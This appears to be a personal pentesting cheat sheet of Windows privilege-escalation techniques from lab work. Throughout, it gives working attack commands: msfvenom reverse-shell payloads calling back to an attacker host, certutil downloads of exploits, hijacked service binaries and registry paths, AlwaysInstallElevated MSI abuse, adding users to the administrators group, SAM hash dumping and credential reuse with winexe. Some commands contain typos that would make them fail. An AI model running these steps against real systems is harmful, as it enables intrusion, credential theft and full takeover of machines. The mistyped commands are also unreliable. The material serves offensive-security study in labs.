# Windows



## Manual Enumeration

### System

```powershell
systeminfo  # host name, OS Name, OS version, etc…
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic [command]
```

### User

```powershell
whoami
whoami /priv
whoami /groups
whoami /all
net user  # show users that are on the machine
net user [user]  # get information about a specific user
net localgroup administrator  # get users that belong to the administrator group
```

### Network

```powershell
ipconfig
ipconfig /all
arp -a
route print
netstat -ano
```

### Password Hunting

```powershell
findstr /si password *.txt *.ini *.config *xml  # searches from the directory for the word password in all the specified files
dir secret.doc /s /p  # searches recursively for a file called secret.doc
```

### A/V and Firewall Enumeration

```powershell
sc query windefend
sc queryex type= service
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```

## Automated Enumeration

### Executables

* winPEAS
* seatbelt.exe
* Watson.exe
* SharpUp.exe

### PowerShell

* Sherlock.ps1
* PowerUp.ps1
* jaws-enum.ps1

### Other

* windows-exploit-suggester.py
* Exploit Suggester (Metasploit)

## Escalation Path Techniques

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Kernel Exploits

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

#### Metasploit

```bash
# From a Meterpreter shell
meterpreter > run post/multi/recon/local_exploit_suggester
# Ex: ms10_015 kitrap0d
msf > use exploit/windows/local/ms10_015_kitrap0d
```

#### Manual

```bash
# Foothold
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > manual.aspx
ftp <IP>  # Anonymous login
put manual.aspx
nc -lvnp 4444
http://<IP>/manual.aspx
# Exploit - after running windows-exploit-suggester
# Can Google for exploits already compiled
certutil -f http://<IP>/MS10-059.exe ms.exe  # From target
nc -lvnp 5555  # From Kali
ms.exe <Kali-IP> 5555  # From target
```

### Service Exploits

#### Basic Commands

```powershell
sc qc <name>  # Query the configuration of a service
sc query <name>  # Query the current status of a service
sc config <name> <option>= <value>  # Modify a configuration option of a service
net start/stop <name>  # Start/Stop a service
```

#### Insecure Service Permissions

```powershell
# If we have permission to change configuraiton of a service which runs with SYSTEM
# We can change the executable the service uses to one of our own
# CATCH: We must be able to stop/start the service
.\accesscheck.exe /accpeteula -uwcqv user daclsvc
sc qc daclsvc
sc query daclsvc
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
net start daclsvc
```

#### Binary Paths

```powershell
# Detection
powshell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
# Another way
accesschk64.exe -uwcv Everyone *
# In either case, look for 'CanRestart True' as the service will need to be restarted
accesschk64.exe -wuvc daclsvc  # Running against a found service
# Look for SERVICE_CHANGE_CONFIG

# Exploitation
sc qc daclsvc  # Identify binary path
sc config daclsvc binpath="net localgroup administrators user /add"
sc qc daclsvc
netlocalgroup administrators
sc start daclsvc 
netlocalgroup administrators
```

#### Unquoted Service Paths

```powershell
# Detection
powshell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
# Look for ServiceName where Path does not contain any quotes (and can restart)
# Then look for which directory BUILTIN\Users can RW
.\accesscheck.exe /accpeteula -uwcqv C:\
.\accesscheck.exe /accpeteula -uwcqv "C:\Program Files\"
.\accesscheck.exe /accpeteula -uwcqv "C:\Program Files\Unquoted Path Service\"
.\accesscheck.exe /accpeteula -uwcqv user daclsvc
copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
net start unquotedsvc

sc qc unquotedsvc
# Exploitation
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
# Copy the generated file, common.exe, to the Windows VM.
# Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
# Open command prompt and type:
sc start unquotedsvc
```

#### Weak Registry Permissions

```powershell
powshell -exec bypass
Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentConrtrolSet\Services\regsvc
.\accesschk.exe /accepteula -ucqv user regsvc
reg query HKLM\System\CurrentConrtrolSet\Services\regsvc
reg add HKLM\System\CurrentConrtrolSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
net start regsvc
```

#### Insecure Service Executables

```powershell
.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
.\accesschk.exe /accepteula -uvqc filepermsvc
copy "C:\Program Files\File Permissions Service\filepermservice.exe" C\"Temp
copy -Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
net start filepermsvc
```

#### DLL Hijacking

```powershell
# Detection
.\accesschk.exe /accepteula -uvqc dllsvc
sc qc dllsvc
# ProcMon requires admin permissions
# Checks which dll's are missing and the directory we may be able to write to

# Exploitation
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o hijackme.dll
copy \\<IP>\tools\hijackme.dll C:\Temp
net stop dllsvc
net start dllsvc
```

### Registry Exploits

#### Autoruns

```powershell
# Detection
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
copy /Y reverse.exe "C:\Program Files\Autorun Program\program.exe"
RESTART WINDOWS

# Open command prompt and type:
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
# In Autoruns, click on the ‘Logon’ tab.
# From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
# In command prompt type: 
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
# From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.

powershell -ep bypass
. .\PowerIp.ps1
Invoke-AllChecks

# Exploitation
msfconsole
msf > use multi/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > run
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> -f exe -o program.exe
# Copy program.exe to the Windows target
# Place program.exe in ‘C:\Program Files\Autorun Program’.
# To simulate the privilege escalation effect, logoff and then log back on as an administrator user.
# In Kali, wait for a session to open in Metasploit
```

#### AlwaysInstallElevated

```powershell
# Detection
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
# From the output, notice that "AlwaysInstallElevated" value is 1
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
# From the output, notice that “AlwaysInstallElevated” value is 1.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o /tools/reverse.msi
copy \\<IP>\tools\reverse.msi .
msiexec /quiet /qn /i reverse.msi

# Exploitation
## From Kali
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost [Kali VM IP Address]
run
# Open an additional command prompt and type:
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> -f msi -o setup.msi
# Copy the generated file, setup.msi, to the Windows VM.

## From Windows Target
# Place ‘setup.msi’ in ‘C:\Temp’.
# Open command prompt and type:
msiexec /quiet /qn /i C:\Temp\setup.msi
```

#### regsvc ACL

```powershell
# Detection
powershell -ep bypass
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
# Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.

# Exploitation
# Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Kali VM.
# In Kali, open windows_service.c in a text editor and replace the command used by the system() function to:
cmd.exe /k net localgroup administrators user /add
x86_64-w64-mingw32-gcc windows_service.c -o x.exe  # NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64'
# Copy the generated file x.exe, to the Windows VM

# Place x.exe in ‘C:\Temp’.
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
sc start regsvc
net localgroup administrators
```

### Passwords

```powershell
# Search types of files for the word password
findstr /si password *.txt (*.xml, *.ini)
# Check for file shares only listening locally i.e. SMB (port forward)
netstat -ano  
# Searching registry
reg query HKLM /f password /t REG_SZ /s  # Look for plaintext passwords in output
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # find username and default passowrd
# Could be password reuse to test on Administrator or other account

# Exploit - from Kali
winexe -U '<user>:<password>' //<target-IP> cmd.exe
winexe -U '<user>:<password>' --system //<target-IP> cmd.exe
```

#### Saved Creds / RunAs

```powershell
# Stored credentials
cmdkey /list
runas /savecred /user:admin C:\PrivEsc\reverse.exe

cmdkey /list  # Look for Current stored credentials
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt
```

#### Configuration Files

```powershell
# Recursivley search for files in the current directory
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt
# winexe can then be used to log into the system
```

#### SAM

```powershell
# The SAM and SYSTEM files are located in the C:\System32\config directory
# The files are locked while Windows is running
# Backups of the files may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories
# samdump & pwdump both can dump the hashes from the SAM
python2 pwdump.py /tools/SYSTEM /tools/SAM
```

#### Port Forward

```bash
# From Kali
# edit sshd_config, by uncommenting PermitRootLogin yes
service ssh restart
service ssh start
# From target
# Download Plink to the target
certutil -urlcache -f http://<IP>/plink.exe plink.exe
plink.exe -l root -pw <password> -R 445:127.0.0.1:445 <Kali-IP>
# Will be brought to root login within same shell
netstat -ano | grep 445  # Verify listening
winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
```

### Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} ft TaskName,TaskPath,State
# View contents of any interesting scripts
# Check to see if the file can be written to
accesschk.exe /accepteula -quv user <script-name>
echo C:\PrivEsc\reverse.exe >> <script-name>
# Wait for scheduled task to run
```

### Insecure GUI Apps

```powershell
# In older verions of Windows, users could be granted permissions to run certain GUI apps with admin privileges
# Example - MS Paint
1. Open up the MS Paint application
2. tasklist /V | findstr mspaint.exe  # Shows running as admin privileges
3. In MS Paint, click File --> Open
4. Click in the navigation bar and go to 'file://c:/windows/system32/cmd.exe
5. A Command Prompt shoudl spawn and should be running with admin privileges
```

### Startup Apps

```powershell
# Detection
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# From the output notice that the “BUILTIN\Users” group has full or write access

# Exploitation
Metasploit, use multi/handler, set payload windows/meterpreter/reverse_tcp, run
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o x.exe
# Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.
# Logoff and Login with admin account credentials
# Wait for session to be created in Metasploit
```

### Installed Apps

```powershell
# Searching Exploit-DB filtering on local, Windows, and priv esc
tasklist /V
.\seatbelt.exe  NonstandardProcesses
```

### Token Impersonation

```powershell
whoami /priv
meterpreter > getprivs
# Look for SeImpersonatePrivilege as Enabled
# Can use windows-exploit-suggester to find potato attacks
# SeAssignPrimaryToken
```

### Potato Attacks

```powershell
meterpreter > run post/multi/recon/local_exploit_suggester
msf use exploit windows/local/ms16_065_reflection
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
meterpreter > shell
```

#### Alternate Data Streams

```powershell
# Regular directory listing
dir
hm.txt
# Recursive directory listing identifying alternate data streams
dir /R
hm.txt
hm.txt:root.txt:$DATA
# Read alternate data stream
more < hm.txt:root.txt:$DATA
```

### Port Forwarding

```powershell
# From Kali - Make sure PermitRootLogin is set to yes in /etc/ssh/sshd_config
service ssh restart
# From target
.\plink.exe kali@<kali-IP> -R <kali-port>:127.0.0.1:<port-to-forward-to>
.\plink.exe kali@<kali-IP> -R 445:127.0.0.1:445
```

### WSL

Running Linux on top of Windows

```powershell
where /R c:\windows wsl.exe
/path/to/wsl.exe whoami
where /R c:\windows bash.exe
/path/to/bash.exe
whoami, hostname, uname -a
python -c "import pty;pty.spawn('/bin/bash')"  # Get a TTY shell
# General Linux enumeration (history, .bash_history, etc.)
# If credentials are found...
psexec.py
smbexec.py
wmiexec.py
```

### getsystem

```bash
meterpreter > getsystem
meterpreter > getsystem -h
```

### Executable Files

```powershell
# Detection
powershell -ep bypass
Invoke-AllChecks
# If we know where the service exists:
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
# Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.

# Exploitation
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
net localgroup administrators
```
